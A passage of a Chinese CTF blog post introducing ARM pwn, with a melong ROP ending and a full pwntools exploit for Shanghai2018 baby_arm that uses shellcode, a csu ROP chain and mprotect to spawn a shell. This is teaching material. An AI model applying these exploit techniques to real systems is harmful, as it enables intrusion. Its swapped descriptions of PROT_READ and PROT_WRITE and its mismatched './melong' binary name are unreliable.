class="number">0x54</span> + p32(pop_r0) + p32(next(libc.search(<span class="string">"/bin/sh"</span>))) + p32(libc.sym[<span class="string">'system'</span>])</span><br><span class="line">check(<span class="string">"12.0"</span>,<span class="string">"12.0"</span>)</span><br><span class="line">pt(<span class="string">"-1"</span>)</span><br><span class="line">w_rite(rop)</span><br><span class="line">out()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="Shanghai2018-baby-arm"><a href="#Shanghai2018-baby-arm" class="headerlink" title="Shanghai2018 - baby_arm"></a>Shanghai2018 - baby_arm</h2><p><a href="https://github.com/bash-c/pwn_repo/tree/master/Shanghai2018_baby_arm" target="_blank" rel="noopener">题目链接</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec arm </span><br><span class="line"></span><br><span class="line">[*] <span class="string">'/home/pluto/\xe6\xa1\x8c\xe9\x9d\xa2/pwn/arm_pwn/arm'</span></span><br><span class="line">    Arch:     aarch64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
+<p>64位的ARM，保护只开了NX<br>在IDA中我发现了一个特别的函数<br>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。<br>函数原型如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure></p>
+<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
+<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
+<p>1）PROT_READ：表示内存段内的内容可写；</p>
+<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
+<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
+<p>4）PROT_NONE：表示内存段中的内容根本没法访问。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">	p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi"</span>,<span class="string">"./melong"</span>])</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"d"</span>:</span><br><span class="line">	p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi"</span>,<span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"./melong"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9888</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./arm"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_rop</span><span class="params">(call, x0, x1, x2)</span>:</span></span><br><span class="line">    payload = flat(<span class="number">0x4008CC</span>, <span class="string">'00000000'</span>, <span class="number">0x4008ac</span>, <span class="number">0</span>, <span class="number">1</span>, call)</span><br><span class="line">    payload += flat(x2, x1, x0)</span><br><span class="line">    payload += <span class="string">'22222222'</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = asm(<span class="string">'mov x0, x0'</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.execve(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"Name:"</span>, padding * <span class="number">0x10</span> + sc)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat(cyclic(<span class="number">72</span>), csu_rop(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, elf.got[<span class="string">'__gmon_start__'</span>], <span class="number">8</span>))</span><br><span class="line">payload += flat(<span class="number">0x400824</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line">p.send(flat(elf.plt[<span class="string">'mprotect'</span>]))</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">"DEBUG: "</span>)</span><br><span class="line">p.sendafter(<span class="string">"Name:"</span>, padding * <span class="number">0x10</span> + sc)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(cyclic(<span class="number">72</span>), csu_rop(elf.got[<span class="string">'__gmon_start__'</span>], <span class="number">0x411000</span>, <span class="number">0x1000</span>, <span class="number">7</span>))</span><br><span class="line">payload += flat(<span class="number">0x411068</span>)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">HackPluto</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2020/04/26/ARM-pwn入门/">http://yoursite.com/2020/04/26/ARM-pwn入门/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2020/04/26/ARM-pwn入门/">April 26th 2020, 4:07:35 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2020/04/26/ARM-pwn入门/">April 27th 2020, 3:39:40 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2020/04/27/NPUCTF2020-pwn-WriteUp/" title="NPUCTF2020 pwn WriteUp">
+                    <div class="nextTitle">NPUCTF2020 pwn WriteUp</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/04/23/2020-i-春秋-虎符杯-pwn-题解writeup/" title="2020 i-春秋 虎符杯 pwn 题解writeup">
+                    <div class="prevTitle">2020 i-春秋 虎符杯 pwn 题解writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:turing0day@gmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/HackPluto" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ARM-PWN"><span class="toc-number">1.</span> <span class="toc-text">ARM PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建-基于Ubuntu18-04"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建(基于Ubuntu18.04)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.2.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#32位ARM指令集"><span class="toc-number">1.2.1.</span> <span class="toc-text">32位ARM指令集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64位ARM指令集"><span class="toc-number">1.2.2.</span> <span class="toc-text">64位ARM指令集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jarvis-oj-typo"><span class="toc-number">1.3.</span> <span class="toc-text">Jarvis oj - typo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#还原符号表"><span class="toc-number">1.3.1.</span> <span class="toc-text">还原符号表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#定位漏洞点"><span class="toc-number">1.3.2.</span> <span class="toc-text">定位漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-number">1.3.3.</span> <span class="toc-text">get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Codegate2018-melong"><span class="toc-number">1.4.</span> <span class="toc-text">Codegate2018 - melong</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找漏洞点"><span class="toc-number">1.4.1.</span> <span class="toc-text">寻找漏洞点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shanghai2018-baby-arm"><span class="toc-number">1.5.</span> <span class="toc-text">Shanghai2018 - baby_arm</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 42
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/2020/05/07/Rust学习笔记/">Rust学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/01</span><a class="archive-post-title" href="/2020/05/01/CTFshow-WriteUp/">CTFshow WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href="/2020/04/27/NPUCTF2020-pwn-WriteUp/">NPUCTF2020 pwn WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/26</span><a class="archive-post-title" href="/2020/04/26/ARM-pwn入门/">ARM pwn入门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020-i-春秋-虎符杯-pwn-题解writeup/">2020 i-春秋 虎符杯 pwn 题解writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/pwnable-kr-WriteUp/">pwnable.kr WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/BUUCTF刷题记录/">BUUCTF刷题记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/HITCON-Training-Writeup/">HITCON-Training-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href="/2020/01/03/PowerPC汇编学习/">PowerPC汇编学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2019/11/11/Linux堆溢出unlink攻击/">Linux堆溢出unlink攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2019/11/06/Linux堆溢出漏洞--off-by-one/">Linux堆溢出漏洞--off-by-one</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href="/2019/11/01/CCProxy栈溢出漏洞分析及利用/">CCProxy栈溢出漏洞分析及利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2019/10/28/DirtyCow漏洞复现及原理分析/">DirtyCow漏洞复现及原理分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2019/10/28/树状数组/">树状数组</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/2019/10/17/堆的分配原理分析/">堆的分配原理分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href="/2019/10/09/pwn-堆溢出/">PWN-堆溢出</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href="/2019/09/30/格式化字符串漏洞/">格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href="/2019/09/29/花式栈溢出技巧/">花式栈溢出技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/27</span><a class="archive-post-title" href="/2019/09/27/看雪KCTF2019wp/">看雪KCTF2019wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href="/2019/09/24/反静态调试总结/">反静态调试总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/2019/09/20/msf恶意代码免杀总结/">msf恶意代码免杀总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2019/09/01/windows后渗透维权/">windows后渗透维权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href="/2019/08/14/基于BROP的栈溢出漏洞利用/">基于BROP的栈溢出漏洞利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href="/2019/08/09/ACM数论/">ACM数论</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/2019/08/06/Traceme动态分析与静态分析/">Traceme动态分析与静态分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2019/08/01/Pwn-栈溢出与canary/">Pwn--栈溢出与绕过防护</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2019/08/01/SSH代理与端口转发/">SSH代理与端口转发</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href="/2019/07/31/LAMP安装及配置/">LAMP安装及配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/13</span><a class="archive-post-title" href="/2019/06/13/攻防世界逆向入门writeup/">攻防世界逆向入门writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/12</span><a class="archive-post-title" href="/2019/06/12/2019看雪CTF逆向Q1writeup/">2019看雪CTF逆向Q1writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/02</span><a class="archive-post-title" href="/2019/06/02/Linux下的iptables详解/">Linux下的iptables详解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/自己动手写工具(3)--ARP欺骗/">自己动手写工具(3)--ARP欺骗</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/素数个数求解与素数的判定/">素数个数求解与素数的判定</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/使用动态规划-DP-解决最大公共子串与最大公共子序列问题/">使用动态规划(DP)解决最大公共子串与最大公共子序列问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/自己动手写工具(2)--TCP代理/">自己动手写工具(2)--TCP代理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href="/2019/04/28/一次信息收集之绕过CDN查询真实ip/">一次信息收集之绕过CDN查询真实ip</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href="/2019/04/25/信息收集之DNS域名解析/">信息收集之DNS域名解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2019/04/23/自己动手写工具(1)--Netcat/">自己动手写工具（1）--Netcat</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/python下多核/">python下多核，单核CPU对于并行，并发执行效率的对比</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/sqli-labs/">sqli-labs 通关详解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href="/2019/04/16/hello-world/">HackPluto's Blog</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ACM,数论"><span class="iconfont-archer">&#xe606;</span>ACM,数论</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
+    
+        <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux,LAMP"><span class="iconfont-archer">&#xe606;</span>Linux,LAMP</span>
+    
+        <span class="sidebar-tag-name" data-tags="powerpc,汇编"><span class="iconfont-archer">&#xe606;</span>powerpc,汇编</span>
+    
+        <span class="sidebar-tag-name" data-tags="Rust,vscode,mac"><span class="iconfont-archer">&#xe606;</span>Rust,vscode,mac</span>
+    
+        <span class="sidebar-tag-name" data-tags="IDA,OllyDB"><span class="iconfont-archer">&#xe606;</span>IDA,OllyDB</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSH,端口转发"><span class="iconfont-archer">&#xe606;</span>SSH,端口转发</span>
+    
+        <span class="sidebar-tag-name" data-tags="MSF,免杀"><span class="iconfont-archer">&#xe606;</span>MSF,免杀</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息收集,社会工程学"><span class="iconfont-archer">&#xe606;</span>信息收集,社会工程学</span>
+    
+        <span class="sidebar-tag-name" data-tags="动态规划(DP)"><span class="iconfont-archer">&#xe606;</span>动态规划(DP)</span>
+    
+        <span class="sidebar-tag-name" data-tags="花指令,静态调试,Movfuscator"><span class="iconfont-archer">&#xe606;</span>花指令,静态调试,Movfuscator</span>
+    
+        <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
+    
+        <span class="sidebar-tag-name" data-tags="PWN,BROP,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,BROP,栈溢出</span>
+    
+        <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
+    
+        <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具,python,Netcat"><span class="iconfont-archer">&#xe606;</span>工具,python,Netcat</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具,python,proxy"><span class="iconfont-archer">&#xe606;</span>工具,python,proxy</span>
+    
+        <span class="sidebar-tag-name" data-tags="栈溢出,PWN"><span class="iconfont-archer">&#xe606;</span>栈溢出,PWN</span>
+    
+        <span class="sidebar-tag-name" data-tags="CCProxy,栈溢出,pwn"><span class="iconfont-archer">&#xe606;</span>CCProxy,栈溢出,pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="arm,pwn"><span class="iconfont-archer">&#xe606;</span>arm,pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="unlink,heap,pwn,Android"><span class="iconfont-archer">&#xe606;</span>unlink,heap,pwn,Android</span>
+    
+        <span class="sidebar-tag-name" data-tags="python,多线程"><span class="iconfont-archer">&#xe606;</span>python,多线程</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn,Heap"><span class="iconfont-archer">&#xe606;</span>pwn,Heap</span>
+    
+        <span class="sidebar-tag-name" data-tags="概率法求素数,算法"><span class="iconfont-archer">&#xe606;</span>概率法求素数,算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具,python,arp_poison"><span class="iconfont-archer">&#xe606;</span>工具,python,arp_poison</span>
+    
+        <span class="sidebar-tag-name" data-tags="unlink,heap,pwn"><span class="iconfont-archer">&#xe606;</span>unlink,heap,pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf,web,sql注入"><span class="iconfont-archer">&#xe606;</span>ctf,web,sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn,Format String Vulnerability"><span class="iconfont-archer">&#xe606;</span>pwn,Format String Vulnerability</span>
+    
+        <span class="sidebar-tag-name" data-tags="PWN,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,栈溢出</span>
+    
+        <span class="sidebar-tag-name" data-tags="windows,影子账户"><span class="iconfont-archer">&#xe606;</span>windows,影子账户</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux,DirtyCow"><span class="iconfont-archer">&#xe606;</span>Linux,DirtyCow</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn,堆,glibc"><span class="iconfont-archer">&#xe606;</span>pwn,堆,glibc</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
